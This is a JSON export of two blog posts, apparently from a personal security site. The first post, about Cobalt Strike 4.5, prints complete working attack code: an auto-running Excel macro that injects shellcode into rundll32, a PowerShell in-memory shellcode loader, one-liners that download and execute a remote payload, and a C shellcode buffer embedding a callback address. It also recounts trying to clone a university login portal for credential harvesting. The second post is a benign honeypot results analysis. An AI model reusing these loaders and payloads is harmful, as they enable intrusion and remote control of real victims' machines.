[{"content":"Ah, Cobalt Strike, HelpSystems' infamous (but legitimate) Red Teaming product coopted by attackers worldwide for malicious purposes. For those unfamiliar, Cobalt Strike is an adversarial toolkit. Its official capacity in the security industry is to simulate attacks for testing purposes. Of course, as is perhaps expected, given the prompt release of each new version to the Internet, those with less noble intentions also make use of the software.\nBy certain means, I have obtained a copy of Cobalt Strike version 4.5, released on December 14th, 2021. As this is a recent, licensed version, I was curious about which type of malicious operations I could successfully perform and the code behind them. Of course, as with all content posted on my website, education is the only objective. I carried out all testing in a cloud lab environment, and I suggest you do the same should you follow my processes here. Enjoy!\nEnvironment I prefer to host my testing machines off-site, especially when dealing with unverified software, such as my copy of Cobalt Strike. To facilitate that, Google\u0026rsquo;s Cloud Compute Engine comes in handy. Unfortunately, due to licensing agreements with Microsoft, it is cheaper to run Windows hosts in Azure, so I have split my network like so:\nGoogle Cloud VPC └ Cobalt Strike (Debian 10) Azure VPC └ Victim Host (Windows 10) Microsoft Office Macro Generation Microsoft recently announced that they will disable MS Office macros embedded in files downloaded from the Internet by default — it\u0026rsquo;s about time. Office macro attacks are so common that Cobalt Strike even has a dedicated button to allow for their simple generation.\nOf course, I first have to set up a \u0026ldquo;listener,\u0026rdquo; something for my macro to contact. Luckily, HelpSystems provides their users (and abusers) with a set of well-detailed documentation. I decided to use windows/beacon_http/reverse_http as my payload, configured as shown below.\nUpon generation of the macro, Cobalt Strike displayed macro deployment instructions. Red teaming is fool-proof these days!\nHere is the source code of the macro:\nPrivate Type PROCESS_INFORMATION hProcess As Long hThread As Long dwProcessId As Long dwThreadId As Long End Type Private Type STARTUPINFO cb As Long lpReserved As String lpDesktop As String lpTitle As String dwX As Long dwY As Long dwXSize As Long dwYSize As Long dwXCountChars As Long dwYCountChars As Long dwFillAttribute As Long dwFlags As Long wShowWindow As Integer cbReserved2 As Integer lpReserved2 As Long hStdInput As Long hStdOutput As Long hStdError As Long End Type #If VBA7 Then Private Declare PtrSafe Function CreateStuff Lib \u0026#34;kernel32\u0026#34; Alias \u0026#34;CreateRemoteThread\u0026#34; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr Private Declare PtrSafe Function AllocStuff Lib \u0026#34;kernel32\u0026#34; Alias \u0026#34;VirtualAllocEx\u0026#34; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr Private Declare PtrSafe Function WriteStuff Lib \u0026#34;kernel32\u0026#34; Alias \u0026#34;WriteProcessMemory\u0026#34; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr Private Declare PtrSafe Function RunStuff Lib \u0026#34;kernel32\u0026#34; Alias \u0026#34;CreateProcessA\u0026#34; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long #Else Private Declare Function CreateStuff Lib \u0026#34;kernel32\u0026#34; Alias \u0026#34;CreateRemoteThread\u0026#34; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long Private Declare Function AllocStuff Lib \u0026#34;kernel32\u0026#34; Alias \u0026#34;VirtualAllocEx\u0026#34; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long Private Declare Function WriteStuff Lib \u0026#34;kernel32\u0026#34; Alias \u0026#34;WriteProcessMemory\u0026#34; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long Private Declare Function RunStuff Lib \u0026#34;kernel32\u0026#34; Alias \u0026#34;CreateProcessA\u0026#34; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long #End If Sub Auto_Open() Dim myByte As Long, myArray As Variant, offset As Long Dim pInfo As PROCESS_INFORMATION Dim sInfo As STARTUPINFO Dim sNull As String Dim sProc As String #If VBA7 Then Dim rwxpage As LongPtr, res As LongPtr #Else Dim rwxpage As Long, res As Long #End If myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _ 13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _ -42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _ -117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _ -43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,80,0,0,0,83,80,104,87,-119,-97, _ -58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _ 104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _ -43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _ -1,-1,47,110,56,115,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _ 0,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _ 83,73,69,32,57,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,49,59,32,84,114,105,100,101,110,116,47,53,46,48,59,32,76,66, _ 66,82,79,87,83,69,82,41,13,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _ 104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _ -123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,51,53,46,49,57,55,46,48,46,54,50,0,0,0,0,0) If Len(Environ(\u0026#34;ProgramW6432\u0026#34;)) \u0026gt; 0 Then sProc = Environ(\u0026#34;windir\u0026#34;) \u0026amp; \u0026#34;\\\\SysWOW64\\\\rundll32.exe\u0026#34; Else sProc = Environ(\u0026#34;windir\u0026#34;) \u0026amp; \u0026#34;\\\\System32\\\\rundll32.exe\u0026#34; End If res = RunStuff(sNull, sProc, ByVal 0\u0026amp;, ByVal 0\u0026amp;, ByVal 1\u0026amp;, ByVal 4\u0026amp;, ByVal 0\u0026amp;, sNull, sInfo, pInfo) rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), \u0026amp;H1000, \u0026amp;H40) For offset = LBound(myArray) To UBound(myArray) myByte = myArray(offset) res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0\u0026amp;) Next offset res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0) End Sub Sub AutoOpen() Auto_Open End Sub Sub Workbook_Open() Auto_Open End Sub VirusTotal Report\n15 of 59 antivirus programs capable of processing macro-loaded Excel files reported malicious activity from the script above, including Microsoft Defender. Thus, I will likely have to turn off Microsoft Defender to run the macro. Avast\u0026rsquo;s YARA Rule contributions specifically identified the maco as originating from Cobalt Strike.\nI found the absence of my IP address within the code particularly interesting. I assume it can be reconstructed from the obfuscated code by using the values in myArray since a plain address would be easy to find and flag as malicious. I have censored my IP in screenshots thus far — if you can reconstruct it from that array, please send me an email. I would love to know!\nExecution Here comes the fun part: let\u0026rsquo;s test the functionality of the macro. The software specifications of the Windows victim can be seen in the screenshot below. Sidenote: I find it disturbing that links to TikTok, mobile games, and Roblox are included in the Start Menu even in Azure images. What a nightmare.\nMicrosoft Defender immediately quarantined my Excel file upon saving it with the macro — annoying for my purposes, but a good thing nonetheless. However, many businesses do not remain vigilant when considering malware mitigation processes such as updating antivirus signatures, so the code generated by Cobalt Strike still poses a serious threat.\nDisabling Defender allowed me to proceed, and\u0026hellip; Exploitation was successful! From here, a variety of options were available, including the ability to upload files, attempt privilege escalation, and more. Fascinating stuff. Unfortunately, not all features worked as expected, but I am not sure if this is due to a misconfiguration on my part or whether some of the exploits Cobalt Strike attempted have been patched by Microsoft.\nPowerShell Script Using the same listener, I generated the following PowerShell script in Cobalt Strike.\nSet-StrictMode -Version 2 function func_get_proc_address { Param ($var_module, $var_procedure) $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split(\u0026#39;\\\\\u0026#39;)[-1].Equals(\u0026#39;System.dll\u0026#39;) }).GetType(\u0026#39;Microsoft.Win32.UnsafeNativeMethods\u0026#39;) $var_gpa = $var_unsafe_native_methods.GetMethod(\u0026#39;GetProcAddress\u0026#39;, [Type[]] @(\u0026#39;System.Runtime.InteropServices.HandleRef\u0026#39;, \u0026#39;string\u0026#39;)) return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(\u0026#39;GetModuleHandle\u0026#39;)).Invoke($null, @($var_module)))), $var_procedure)) } function func_get_delegate_type { Param ( [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters, [Parameter(Position = 1)] [Type] $var_return_type = [Void] ) $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(\u0026#39;ReflectedDelegate\u0026#39;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(\u0026#39;InMemoryModule\u0026#39;, $false).DefineType(\u0026#39;MyDelegateType\u0026#39;, \u0026#39;Class, Public, Sealed, AnsiClass, AutoClass\u0026#39;, [System.MulticastDelegate]) $var_type_builder.DefineConstructor(\u0026#39;RTSpecialName, HideBySig, Public\u0026#39;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(\u0026#39;Runtime, Managed\u0026#39;) $var_type_builder.DefineMethod(\u0026#39;Invoke\u0026#39;, \u0026#39;Public, HideBySig, NewSlot, Virtual\u0026#39;, $var_return_type, $var_parameters).SetImplementationFlags(\u0026#39;Runtime, Managed\u0026#39;) return $var_type_builder.CreateType() } If ([IntPtr]::size -eq 8) { [Byte[]]$var_code = [System.Convert]::FromBase64String(\u0026#39;\u0026lt;VERY long Base64 string\u0026gt;\u0026#39;) for ($x = 0; $x -lt $var_code.Count; $x++) { $var_code[$x] = $var_code[$x] -bxor 35 } $var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))) $var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40) [System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length) $var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void]))) $var_runme.Invoke([IntPtr]::Zero) } VirusTotal Report\nMany more antivirus engines (32/59) detected this script than the Excel macro. Examining the code, you may notice the [Byte[]]$var_code = [System.Convert]::FromBase64String('\u0026lt;VERY long Base64 string\u0026gt;') line; while the code is relatively short, the Base64 string contained within it exceeds 350,000 characters, so I did not include the full output. Using alternative encoding is a classic malware obfuscation tactic, and I am not surprised to see it employed here.\nUsing, [System.Convert]::FromBase64String() I decoded the Base64 string, which revealed a massive set of numbers. It appears that these numbers are bitwise XORed with 35 (ASCII \u0026lsquo;#') to reconstruct the malicious commands. As shown by the VirusTotal report, this process was not complex enough to prevent widespread detection by updated AV engines.\nAs with the Excel macro, running this script on the victim host also established a tunnel back to Cobalt Strike.\nSpecial Delivery Certain situations may present themselves in which an attacker has difficulty planting a file into the victim\u0026rsquo;s environment; thus, HelpSystems has established alternative delivery methods. One such method is *Scripted Web-Delivery,\u0026quot; an all-in-one setup that hosts a malicious file and provides one-liners in different languages to automate fetching and executing the file on the victim host.\nVictim one-liners, given a payload of windows/beacon_http/reverse_http:\npowershell.exe -nop -w hidden -c \u0026#34;IEX ((new-object net.webclient).downloadstring(\u0026#39;http://X.X.X.X:80/a\u0026#39;))\u0026#34; python -c \u0026#34;import urllib2; exec urllib2.urlopen(\u0026#39;http://X.X.X.X:80/a\u0026#39;).read();\u0026#34; Windows Defender identifies the PowerShell threat as TrojanDropper:PowerShell/Cobacis.B.\nMore Stuff C Payload Using the Payload Generator, Cobalt Strike will form a buffer array in several different languages. An example of this is shown below in C, though Java, Python, Perl, PowerShell, and more are supported as well.\nunsigned char buf[] = \u0026#34;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc8\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x75\\x72\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x4f\\xff\\xff\\xff\\x5d\\x6a\\x00\\x49\\xbe\\x77\\x69\\x6e\\x69\\x6e\\x65\\x74\\x00\\x41\\x56\\x49\\x89\\xe6\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x48\\x31\\xc9\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x4d\\x31\\xc9\\x41\\x50\\x41\\x50\\x41\\xba\\x3a\\x56\\x79\\xa7\\xff\\xd5\\xeb\\x73\\x5a\\x48\\x89\\xc1\\x41\\xb8\\x50\\x00\\x00\\x00\\x4d\\x31\\xc9\\x41\\x51\\x41\\x51\\x6a\\x03\\x41\\x51\\x41\\xba\\x57\\x89\\x9f\\xc6\\xff\\xd5\\xeb\\x59\\x5b\\x48\\x89\\xc1\\x48\\x31\\xd2\\x49\\x89\\xd8\\x4d\\x31\\xc9\\x52\\x68\\x00\\x02\\x40\\x84\\x52\\x52\\x41\\xba\\xeb\\x55\\x2e\\x3b\\xff\\xd5\\x48\\x89\\xc6\\x48\\x83\\xc3\\x50\\x6a\\x0a\\x5f\\x48\\x89\\xf1\\x48\\x89\\xda\\x49\\xc7\\xc0\\xff\\xff\\xff\\xff\\x4d\\x31\\xc9\\x52\\x52\\x41\\xba\\x2d\\x06\\x18\\x7b\\xff\\xd5\\x85\\xc0\\x0f\\x85\\x9d\\x01\\x00\\x00\\x48\\xff\\xcf\\x0f\\x84\\x8c\\x01\\x00\\x00\\xeb\\xd3\\xe9\\xe4\\x01\\x00\\x00\\xe8\\xa2\\xff\\xff\\xff\\x2f\\x43\\x41\\x63\\x76\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x73\\x65\\x72\\x2d\\x41\\x67\\x65\\x6e\\x74\\x3a\\x20\\x4d\\x6f\\x7a\\x69\\x6c\\x6c\\x61\\x2f\\x35\\x2e\\x30\\x20\\x28\\x63\\x6f\\x6d\\x70\\x61\\x74\\x69\\x62\\x6c\\x65\\x3b\\x20\\x4d\\x53\\x49\\x45\\x20\\x39\\x2e\\x30\\x3b\\x20\\x57\\x69\\x6e\\x64\\x6f\\x77\\x73\\x20\\x4e\\x54\\x20\\x36\\x2e\\x31\\x3b\\x20\\x54\\x72\\x69\\x64\\x65\\x6e\\x74\\x2f\\x35\\x2e\\x30\\x3b\\x20\\x42\\x4f\\x49\\x45\\x39\\x3b\\x45\\x53\\x45\\x53\\x29\\x0d\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x41\\xbe\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x48\\x31\\xc9\\xba\\x00\\x00\\x40\\x00\\x41\\xb8\\x00\\x10\\x00\\x00\\x41\\xb9\\x40\\x00\\x00\\x00\\x41\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x93\\x53\\x53\\x48\\x89\\xe7\\x48\\x89\\xf1\\x48\\x89\\xda\\x41\\xb8\\x00\\x20\\x00\\x00\\x49\\x89\\xf9\\x41\\xba\\x12\\x96\\x89\\xe2\\xff\\xd5\\x48\\x83\\xc4\\x20\\x85\\xc0\\x74\\xb6\\x66\\x8b\\x07\\x48\\x01\\xc3\\x85\\xc0\\x75\\xd7\\x58\\x58\\x58\\x48\\x05\\x00\\x00\\x00\\x00\\x50\\xc3\\xe8\\x9f\\xfd\\xff\\xff\\x33\\x35\\x2e\\x31\\x39\\x37\\x2e\\x30\\x2e\\x36\\x32\\x00\\x00\\x00\\x00\\x00\u0026#34;; Since it is just an array, it is undetectable by any of the AV engines on VirusTotal (though it is included in Avast\u0026rsquo;s YARA Ruleset). This has huge security implications — this shellcode can be embedded in other programs to great effect.\nI wrapped the buffer array in a small C function for compilation purposes and submitted the binary to VirusTotal, which then yielded four detections, a pitifully small amount nonetheless.\nForeign Connection? While I was toying with the Scripted Web-Delivery functionality, I noticed I received a new connection to my Cobalt Strike team server, however, from a computer I do not own! I ran a WHOIS lookup against the IP address; as it happened, the instance that connected to my Cobalt Strike session is part of Autonomous System Number 9808: Guangdong Province, China. is this some kind of reverse attack, I wonder? Perhaps Cobalt Strike has vulnerabilities of its own.\nI attempted to find any sort of information about the host by executing CS Beacon commands on it — after all, they had invited themselves onto my doorstep — but all attempts timed out. Very odd. If anyone has more information about why this happened, I would love to hear from you over email!\nReport Exporting As Cobalt Strike is intended to be a testing utility, it comes packaged with various features that would befit a penetration tester. One example of this is the report export tool, which generates report documents based on logged activity. Various reports can be generated, such as the IoCs and Hosts PDFs below.\nWebpage Cloning Cobalt Strike also supports webpage cloning, allowing not only for payload injection upon visiting a cloned website, but also credential and activity harvesting. Unfortunately, I was not able to get this to work properly with modern websites, try as I did with my university\u0026rsquo;s SSO portal.\nWrapping Up HelpSystems has provided no shortage of features with Cobalt Strike — that is indisputable. What I have shown here is only a small subset of Cobalt Strike\u0026rsquo;s functionality, and I intend to expand on more of the possibilities in the future.\nWhile I believe it is important to provide penetration testers with polished toolsets, these sorts of applications — Metasploit and Burp Suite included — present a very low barrier to entry for the aspiring cybercriminal. I am not suggesting they should be removed by any means, but it is an important topic to think about. Modern red teaming utilities have evolved to such a degree, abstracting technical concepts, that even beginners have a shot at breaching or infecting corporate systems. It\u0026rsquo;s an interesting debate, and ironic that criminals use the very tools we employ for protection as part of their attack frameworks.\nThank you so much for reading!\n I am open to comments and criticism — I learn alongside you. Please, do not hesitate to suggest an edit.\n Sid Lacy\nEmail • LinkedIn • GitHub\n","permalink":"https://swlacy.com/posts/playing-with-cobalt-strike/","summary":"Fun with Cobalt Strike v4.5","title":"Playing With Cobalt Strike"},{"content":"⇤ Start from the beginning\nFinally, here we are — the conclusion of my honeypot experiment. My original intention was to aim for a total of one million logged attacks, at which point I would shut down the honeypot. However, schoolwork fully occupied my attention for a brief period. Thus, I considered it a better idea to continue collecting data until I could find time to perform a proper analysis. That time is now, and instead of blocking traffic upon \u0026ldquo;only\u0026rdquo; the millionth attack, the Elastic dashboard looks like this:\nThe million-attack target was surpassed by a significant margin. But, without further ado, let\u0026rsquo;s examine the results.\nPreliminary Information All bait services were exposed to the Internet on 19 January 2022 at 3:00 PM PST. I restricted all traffic on my VPC to my IP address on 09 February 2022 at 6:00 PM PST. Thus, services were exposed for external attack for 21 days and 3 hours.\nIn that time, over 1,566,300 attacks were recorded by the following honeypots:\n Adbhoney Ciscoasa Citrixhoneypot Conpot Cowrie Ddospot Dicompot Dionaea Elasticpot Endlessh Glutton Heralding Hellpot Honeypots Honeypy Honeysap Honeytrap Ipphoney Log4pot Mailoney Medpot Rdpy Redishoneypot Snare Tanner  Setup was automated by Telekom\u0026rsquo;s T-POT. Since Dionaea (757,121), Heralding (418,182), Honeytrap (294,052), Cowrie (71,204), Adbhoney (12,440), Rdpy (5,567), and Tanner (4,093) logged the vast majority of the attacks, I will maintain focus on them for the most part.\nThe honeypot was hosted for the duration of its uptime on a Google Cloud instance in The Dalles, Oregon on us-west1. The host OS was Debian 10 and firewall rules permitted ports UDP and TCP 1 to 64000 ingress access from any IP address. This honeypot was not intended to appear as a legitimate target for hackers to manually compromise, but rather a target for malicious bots. As could be seen on Shodan (screenshot below), the host was undisputably a honeypot. Tip: click or tap the image to zoom in.\nNo legitimate host would have that many open ports, and if so\u0026hellip; Well, respectfully, the sysadmin in charge should consider re-evaluating their security policy.\nAll binaries examined in previous sections of this series have been sourced from the honeypots executed here within the aforementioned timeframe.\nData Most Popular Attack Vectors By far, the most common type of attack was brute-forcing common credential sets against services that support login, especially SSH, VNC, RDP, and FTP; I suppose naive attacks are to be expected. Let\u0026rsquo;s take a look at which usernames and passwords were used. T-POT uses Elastic to generate useful word clouds of these points of data.\nUsernames Note that not all usernames are shown here. Download the full dataset here. The top five usernames attempted across all services were:\n root — 6,222 attempts sa — 711 attempts user — 546 attempts admin — 412 attempts test — 145 attempts  All of these, especially root, seem pretty reasonable to me.\nPasswords Note that, as with the usernames, not all passwords are shown here either. Download the full dataset here. The top five passwords attempted across all services were:\n Password — 600 attempts 123456 — 431 attempts 1 — 398 attempts empty/no password — 353 attempts Passw0rd — 292 attempts  Again, all quite reasonable. Here are some that are perhaps less than reasonable:\n raspberryraspberry993311 — 55 attempts; see this post for more information ^_^$$wanniMaBI:: 1433 vl — 40 attempts; what?  Always set unique, secure passwords! The bots that targeted my honeypot take advantage of those who want the convenience of only remembering 123456 as their password.\nOrigins of Attack Things get particularly interesting here — see the breakdown of attacks by country below. Note that even though an attack comes from an ASN located within certain borders, the attacker(s) may very well have routed their traffic in a complex manner to hide their identities. Thus, attacks that originate from the United States but route through Utrecht with a VPN will, of course, appear to be Dutch attacks instead.\nNumerical breakdown in terms of attacks by country:\n Netherlands: 415,771 United States: 205,221 India: 94,108 Vietnam: 89,762 Russia: 78,176 Mexico: 61,626 China: 55,720 Indonesia: 52,440 Brazil: 43,013 Turkey: 29,550  Damned Dutch and their\u0026hellip; cyber criminals? I did not expect these results at all. A map of estimated attack origins is shown below, which can also be downloaded here.\nHere is more information:\nHere is a list of the most common attack origins by IP address:\n 185.232.52.40 — 395,126 attacks 193.169.254.17 — 21,041 attacks 159.89.48.65 — 13,889 attacks 189.84.186.154 — 12,810 attacks 103.103.175.121 — 11,046 attacks 202.88.237.202 — 11,043 attacks 200.23.18.185 — 11,042 attacks 103.151.218.73 — 11,041 attacks 163.53.180.248 — 11,041 attacks 175.111.4.204 — 11,039 attacks  Curiously, as of the time of publication, I appear to be one of the only reporters of 185.232.52.40 on VirusTotal; surprising, given the volume of attacks.\nAnd, finally, here is a list of the top ten attacks by the ASN the origin address belongs to:\n 200313 (\u0026ldquo;Internet It Company Inc\u0026rdquo;): 395,229 attacks 7552 (\u0026ldquo;Viettel Group\u0026rdquo;): 50,968 attacks 14061 (\u0026ldquo;DigitalOcean, LLC\u0026rdquo;): 27,776 attacks 8151 (\u0026ldquo;Uninet S.A. de C.V.\u0026quot;): 26,367 attacks 7713 (\u0026ldquo;PT Telekomunikasi Indonesia\u0026rdquo;): 25,264 attacks 4134 (\u0026ldquo;No.31,Jin-rong Street\u0026rdquo;): 25,247 attacks 45899 (\u0026ldquo;VNPT Corp\u0026rdquo;): 22,694 attacks 197226 (\u0026ldquo;sprint S.A.\u0026quot;): 21,055 attacks 8048 (\u0026ldquo;CANTV Servicios, Venezuela\u0026rdquo;): 19,010 attacks 8452 (\u0026ldquo;TE-AS\u0026rdquo;): 16,526 attacks  Attacks I have included several charts below. Patterns can easily be seen, especially relating to activity from the Netherlands.\nAttempted brute-force attacks towards port 5900 (VNC) by the Netherlands remain the most significant pattern overall in terms of scope — the Netherlands composed over one-third of all 1.5 million attacks on its own. Of particular note is the measurable spikes of activity during those attacks. In all, just under 400,000 attempts were made by what I assume is the same bot or group of bots routing traffic through the Netherlands.\nBrief Conclusions 